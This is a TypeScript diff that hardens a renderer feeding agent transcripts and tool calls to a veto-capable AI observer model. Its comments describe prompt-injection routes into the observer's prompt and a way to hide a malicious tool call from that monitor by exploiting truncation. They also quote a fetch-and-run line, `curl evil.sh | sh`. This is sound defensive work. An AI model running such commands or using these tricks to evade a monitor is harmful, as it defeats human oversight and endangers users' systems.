@@ -20,8 +20,12 @@ import type { SliceName, SliceState, ToolCallRecord } from "./types.ts";
  *   2. SELF-LENGTHENING FENCE around every body, as defence in depth.
  *
  *   3. BRANDED `Sanitized` TYPE. Only the two sanitizers turn a raw string into a
- *      Sanitized value, and every assembly helper accepts Sanitized only. A new
- *      SliceState field that forgets to sanitize does not type-check.
+ *      Sanitized value; every assembly helper accepts Sanitized only, and the function
+ *      that builds the document returns Sanitized, so the assembly region is closed at
+ *      both ends. A new SliceState field that forgets to sanitize does not type-check,
+ *      and neither does concatenating a raw string onto the document. The exported
+ *      wrapper returns `string` and is the one line outside that region; it performs no
+ *      assembly, only a call and a single named unbrand.
  */
 
 /* ------------------------------------------------------------------ *
@@ -32,10 +36,15 @@ declare const SanitizedBrand: unique symbol;
 
 /**
  * A string that has passed through sanitizeSingleLine or sanitizeMultiLine, or that
- * was composed from such strings plus literal text written in this file. There is no
- * cast from string to Sanitized anywhere outside the three functions below
- * (sanitizeSingleLine, sanitizeMultiLine, and the `s` template tag), so an
- * unsanitized value cannot reach the rendered document.
+ * was composed from such strings plus literal text written in this file.
+ *
+ * What this actually buys, stated precisely: `Sanitized` is produced only by the two
+ * sanitizers and by the `s` template tag, whose interpolations are themselves
+ * Sanitized. Every helper that assembles output takes Sanitized parameters, and
+ * renderDocument returns Sanitized, so within that region a raw string can neither
+ * enter nor leave without a compile error -- no cast is available to launder one.
+ * `unbrand` and the exported renderSlices wrapper sit deliberately outside the region,
+ * because the exported signature returns `string`; see the note on renderSlices.
  */
 export type Sanitized = string & { readonly [SanitizedBrand]: true };
 
@@ -67,6 +76,30 @@ function joinLines(parts: Sanitized[]): Sanitized {
   return acc;
 }
 
+/**
+ * Join the preamble and the sections into the finished document, separated by blank
+ * lines. Accepts Sanitized only.
+ *
+ * This exists because `Array.prototype.join` is an untyped boundary: it returns
+ * `string` for any element type, and an array literal mixing Sanitized with a raw
+ * string widens silently to `(Sanitized | string)[]`. While the assembly ended in a
+ * bare `[...].join("\n\n")`, seven cast-free single-line edits compiled cleanly and
+ * emitted attacker-controlled text -- one of them ABOVE the preamble. Routing the
+ * join through a `Sanitized[]` parameter closes that: a raw string in the array is a
+ * compile error at the call site, not a silent widening.
+ */
+function document(parts: Sanitized[]): Sanitized {
+  const first = parts[0];
+  if (first === undefined) return EMPTY;
+  let acc = first;
+  for (let i = 1; i < parts.length; i++) {
+    const next = parts[i];
+    if (next === undefined) continue;
+    acc = s`${acc}\n\n${next}`;
+  }
+  return acc;
+}
+
 /* ------------------------------------------------------------------ *
  * Line separators
  * ------------------------------------------------------------------ */
@@ -84,10 +117,17 @@ function joinLines(parts: Sanitized[]): Sanitized {
  *           through both guards; it must be listed explicitly.
  *   \u000B  LINE TABULATION (VT)
  *   \u000C  FORM FEED (FF)
+ *   \u001C  FILE SEPARATOR
+ *   \u001D  GROUP SEPARATOR
+ *   \u001E  RECORD SEPARATOR
+ *           The three above are no line break to JavaScript, so they produce no
+ *           bypass measurable from here. Python's str.splitlines() splits on all
+ *           three, and this text is prompt data that other tooling does process.
+ *           Listed to close the category, not a demonstrated escape.
  *   \u2028  LINE SEPARATOR
  *   \u2029  PARAGRAPH SEPARATOR
  */
-const LINE_SEPARATOR_CHARS = "\\r\\n\\u0085\\u000B\\u000C\\u2028\\u2029";
+const LINE_SEPARATOR_CHARS = "\\r\\n\\u0085\\u000B\\u000C\\u001C\\u001D\\u001E\\u2028\\u2029";
 
 /** Runs of separators, collapsed to a single space in single-line fields. */
 const SEPARATOR_RUN = new RegExp(`[${LINE_SEPARATOR_CHARS}]+`, "g");
@@ -122,25 +162,61 @@ const FIELD_LIMITS = {
  * each collection is capped too, and dropped entries are reported as structure
  * (status=truncated with the counts) rather than silently vanishing.
  *
- * Together the two tables give a hard worst case for one document:
- *   3 text slices     3 x 50000                        =  150,000
- *   tool calls        100 x (100 + 2000 + overhead)   <=  215,000
- *   skills            100 x (100 + 1000 + overhead)   <=  111,000
- *   marker            12 boundary/preamble occurrences of a marker that is itself
- *                     bounded by the largest field cap + 1                  <= 600,000
- *   ------------------------------------------------------------
- *   Under 1.1M code points, whatever the input -- and the marker term only approaches
- *   its bound if a body is one enormous run of "=". Nothing here grows with the size
- *   of the raw SliceState.
+ * The worst-case document size follows from these two tables plus the marker and the
+ * fence. The round-3 comment claimed "under 1.1M code points, whatever the input" and
+ * was FALSE: it counted the marker but omitted the fence, and missed that the two
+ * inflate independently -- the marker grows on runs of "=", the fences on runs of
+ * backticks, and one input can do both at once in different slices. All-"=" alone
+ * measures 1,022,231, which is why the omission survived; mixing the two measures
+ * 1,228,215. The corrected arithmetic, recomputed rather than papered over:
+ *
+ *   bodies    3 text slices     3 x 50,000                          =   150,000
+ *             tool calls        100 x (2 + 100 + 1 + 2000 + 8)     <=   211,100
+ *             skills            100 x (2 + 100 + 2 + 1000)         <=   110,500
+ *   marker    11 occurrences (1 preamble + 2 per section, and `sees` is deduped so
+ *             there are at most 5 sections) of a marker bounded by the largest
+ *             field cap + 1 = 50,001                               <=   550,011
+ *   fence     2 lines per bodied section, each bounded by the longest backtick run
+ *             in THAT body + 1: text 3 x 2 x 50,001, tool calls
+ *             2 x 2,001, skills 2 x 1,001                          <=   306,010
+ *   structure preamble prose, labels, status attributes            <=     1,500
+ *   ---------------------------------------------------------------------------
+ *   TOTAL                                                          <  1,350,000
+ *
+ * Measured worst case over the adversarial inputs tried: 1,228,215. Nothing in the
+ * table grows with the size of the raw SliceState.
  */
 const ENTRY_LIMITS = {
   toolCalls: 100,
   skills: 100,
 } as const;
 
+/**
+ * The documented upper bound above. Exported so the test asserts the exact figure the
+ * comment claims, and the two cannot drift apart the way they did in round 3.
+ */
+export const DOCUMENTED_MAX_DOCUMENT_CODE_POINTS = 1_350_000;
+
 /* ------------------------------------------------------------------ *
  * Sanitizers -- the only producers of Sanitized values
  * ------------------------------------------------------------------ */
+
+/**
+ * A UTF-16 code unit that is half of a surrogate pair with no partner: a high
+ * surrogate not followed by a low one, or a low surrogate not preceded by a high one.
+ * Such a string cannot be encoded as UTF-8, so it round-trips lossily through any
+ * consumer that re-encodes the prompt.
+ *
+ * Truncation no longer creates these (the caps count code points), but the input can
+ * already contain them -- { transcript: "a\uD800b" } is enough -- so they are
+ * replaced with U+FFFD REPLACEMENT CHARACTER on the way in. One unit in, one unit out,
+ * so this cannot change a code-point count or disturb a cap.
+ */
+const LONE_SURROGATE = /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/g;
+
+function replaceLoneSurrogates(value: string): string {
+  return value.replace(LONE_SURROGATE, "\uFFFD");
+}
 
 /** Truncate to `maxCodePoints` code points. Never splits a surrogate pair. */
 function truncateCodePoints(value: string, maxCodePoints: number): string {
@@ -155,7 +231,8 @@ function truncateCodePoints(value: string, maxCodePoints: number): string {
  * guarantees one ToolCallRecord or skill renders as exactly one `- ` line.
  */
 function sanitizeSingleLine(value: string, maxCodePoints: number): Sanitized {
-  const collapsed = value.replace(SEPARATOR_RUN, " ");
+  const paired = replaceLoneSurrogates(value);
+  const collapsed = paired.replace(SEPARATOR_RUN, " ");
   return truncateCodePoints(collapsed, maxCodePoints) as Sanitized;
 }
 
@@ -165,7 +242,8 @@ function sanitizeSingleLine(value: string, maxCodePoints: number): Sanitized {
  * transcript bodies, which legitimately contain line breaks.
  */
 function sanitizeMultiLine(value: string, maxCodePoints: number): Sanitized {
-  const normalised = value.replace(SEPARATOR_ONE, "\n");
+  const paired = replaceLoneSurrogates(value);
+  const normalised = paired.replace(SEPARATOR_ONE, "\n");
   return truncateCodePoints(normalised, maxCodePoints) as Sanitized;
 }
 
@@ -202,8 +280,18 @@ function num(n: number): Sanitized {
  * The unforgeable marker
  * ------------------------------------------------------------------ */
 
-/** Shortest marker considered, before any lengthening. */
-const MARKER_SEED_LENGTH = 5;
+/**
+ * Shortest marker considered, before any lengthening.
+ *
+ * Raised from 5 to 16. Byte-level unforgeability never depended on this -- the
+ * marker is always at least one longer than any run in the content -- but at a seed
+ * of 5 a near-miss forgery differed from the real boundary by a single character,
+ * and the consumer is a small model rather than a parser. That is the objection
+ * originally raised against the bare fence, relocated rather than removed. Sixteen
+ * costs about 200 characters per document and makes an off-by-one forgery visually
+ * implausible.
+ */
+const MARKER_SEED_LENGTH = 16;
 
 /**
  * Length of the longest consecutive run of `char` in `value`. Single pass, no
@@ -311,6 +399,34 @@ function renderSkill(sk: { name: string; description: string }): Sanitized {
   return s`- ${name}: ${desc}`;
 }
 
+/**
+ * Choose which entries of an oversized collection to render.
+ *
+ * The obvious `slice(0, cap)` -- keep the head -- turns the cardinality cap into a
+ * hiding place: 100 benign `read` calls followed by
+ * `bash(curl evil.sh | sh)` render with the malicious call ABSENT, the last visible
+ * entry a benign read, and the only trace a shown/total count. A veto-capable
+ * verification observer is precisely the control that evades. Keeping the head is
+ * strictly worse than useless here.
+ *
+ * Half from the head and half from the tail. Recent entries are the ones an observer
+ * reasons about, so the tail must survive; keeping some head as well means an attacker
+ * cannot hide a payload by prepending filler either. No truncation rule can guarantee
+ * an arbitrary entry survives -- an attacker with more than `cap` entries can always
+ * bury one in the middle -- but both cheap positional attacks are closed, and the
+ * authoritative shown/total counts ride on the unforgeable marker line.
+ *
+ * The cut point is deliberately NOT marked inside the body. Any in-body gap line would
+ * be renderer text that content could imitate, and the marker cannot be used there:
+ * it is derived FROM the bodies, so nothing in a body may contain it.
+ */
+function headAndTail<T>(entries: T[], cap: number): T[] {
+  if (entries.length <= cap) return entries;
+  const head = Math.floor(cap / 2);
+  const tail = cap - head;
+  return [...entries.slice(0, head), ...entries.slice(entries.length - tail)];
+}
+
 function collectionContent<T>(
   entries: T[],
   cap: number,
@@ -318,7 +434,7 @@ function collectionContent<T>(
   renderEntry: (entry: T) => Sanitized,
 ): SectionContent {
   if (entries.length === 0) return { status: "empty", note: emptyNote };
-  const shown = entries.slice(0, cap);
+  const shown = headAndTail(entries, cap);
   const body = joinLines(shown.map(renderEntry));
   if (entries.length > shown.length) {
     return { status: "truncated", body, shown: shown.length, total: entries.length };
@@ -379,16 +495,61 @@ function renderPreamble(marker: Sanitized): Sanitized {
 }
 
 /**
+ * Build the whole document. Every value in scope here is Sanitized, and the function
+ * returns Sanitized, so the assembly is type-closed: an expression that produces a
+ * plain `string` cannot be returned from it and a plain `string` cannot enter
+ * `document()`. renderSlices below is the only exit, and drops the brand exactly once.
+ */
+function renderDocument(sees: SliceName[], state: SliceState): Sanitized {
+  // Duplicate slice names are deduped, first occurrence winning, before anything is
+  // rendered. Observer definitions are repo-resident and manyOf permits repeats, and
+  // each repeat pays the full body AND marker cost: 500 duplicates measured
+  // 117,834,969 characters. Deduping here rather than in definitions.ts keeps the fix
+  // local to the code that owns the cost, and holds however a caller builds the list.
+  const unique = [...new Set(sees)];
+  if (unique.length === 0) return EMPTY;
+
+  // Sanitize and cap first, derive the marker from the result, then assemble: the
+  // marker is then provably absent from exactly the strings the document contains,
+  // rather than from an over-approximation of them.
+  const contents = unique.map((slice) => ({ slice, content: sliceContent(slice, state) }));
+  const bodies = contents.flatMap(({ content }) => ("body" in content ? [content.body] : []));
+  const marker = deriveMarker(bodies);
+  const sections: Sanitized[] = contents.map(({ slice, content }) =>
+    renderSection(marker, slice, content),
+  );
+  return document([renderPreamble(marker), ...sections]);
+}
+
+/**
+ * The single point at which the brand is dropped. Named so that it is greppable and
+ * so that any future second exit from the Sanitized world is a visible addition
+ * rather than an inferred widening.
+ */
+function unbrand(value: Sanitized): string {
+  return value;
+}
+
+/**
  * Render the requested slices as marker-delimited sections, in the order the observer
  * listed them.
  *
- * SECURITY INVARIANTS -- what is actually enforced, and by what:
+ * SECURITY INVARIANTS -- what is actually enforced, by what, and what is NOT:
  *
  *   Enforced by the type system. `Sanitized` is produced only by sanitizeSingleLine
- *   and sanitizeMultiLine; the `s` template tag and joinLines accept Sanitized only.
- *   A new SliceState field that skips sanitization fails to compile. The seven
- *   attacker-reachable paths are lastUserMessage, lastAssistantMessage, transcript,
- *   ToolCallRecord.name, ToolCallRecord.args, skill.name and skill.description.
+ *   and sanitizeMultiLine. Every assembly helper -- the `s` template tag, joinLines,
+ *   document -- accepts Sanitized only, and renderDocument RETURNS Sanitized, so the
+ *   assembly is closed: no raw string can enter it and no raw string can leave it.
+ *   Adding a SliceState field and forgetting to sanitize it fails to compile, and so
+ *   do all fourteen of the concatenation edits in the type-bypass test.
+ *
+ *   NOT enforced by the type system, stated plainly. `unbrand` and the one-line body
+ *   of renderSlices below are outside the closed region by definition: the exported
+ *   signature returns `string`, so any edit that concatenates onto the RESULT of
+ *   renderSlices, or that returns something else entirely from renderSlices, compiles.
+ *   That is why renderSlices contains no assembly of its own -- a single call and a
+ *   single unbrand -- and why all seven attacker-reachable fields are consumed inside
+ *   renderDocument, where the types do hold.
  *
  *   Enforced by construction. The section marker is a run of "=" one longer than the
  *   longest such run in any body that will be rendered, so no body can contain a
@@ -397,24 +558,17 @@ function renderPreamble(marker: Sanitized): Sanitized {
  *   rides on that marker, so a slice that was never supplied is byte-distinct from a
  *   slice whose body reads "(unavailable)".
  *
- *   Enforced per field. Single-line fields have every run of \r \n \u0085
- *   \u000B \u000C \u2028 \u2029 collapsed to a space, so one record is always
- *   exactly one rendered line.
- *   Multi-line bodies have the same class normalised to \n. All caps
- *   count code points, so truncation never splits a surrogate pair. Collections are
- *   capped in cardinality as well, with the drop reported as status=truncated.
+ *   Enforced per field. Single-line fields have every run of the ten separators in
+ *   LINE_SEPARATOR_CHARS collapsed to a space, so one record is always exactly one
+ *   rendered line. Multi-line bodies have the same class normalised to \n. Unpaired
+ *   surrogates are replaced with U+FFFD. All caps count code points, so truncation
+ *   never splits a surrogate pair. Collections are capped in cardinality as well,
+ *   keeping head and tail so the cap cannot be used to hide a trailing entry, with the
+ *   drop reported as status=truncated.
  *
  *   Defence in depth. Every body is wrapped in a backtick fence that lengthens past
  *   the longest backtick run it contains.
  */
 export function renderSlices(sees: SliceName[], state: SliceState): string {
-  if (sees.length === 0) return "";
-  // Sanitize and cap first, derive the marker from the result, then assemble: the
-  // marker is then provably absent from exactly the strings the document contains,
-  // rather than from an over-approximation of them.
-  const contents = sees.map((slice) => ({ slice, content: sliceContent(slice, state) }));
-  const bodies = contents.flatMap(({ content }) => ("body" in content ? [content.body] : []));
-  const marker = deriveMarker(bodies);
-  const sections = contents.map(({ slice, content }) => renderSection(marker, slice, content));
-  return [renderPreamble(marker), ...sections].join("\n\n");
+  return unbrand(renderDocument(sees, state));
 }
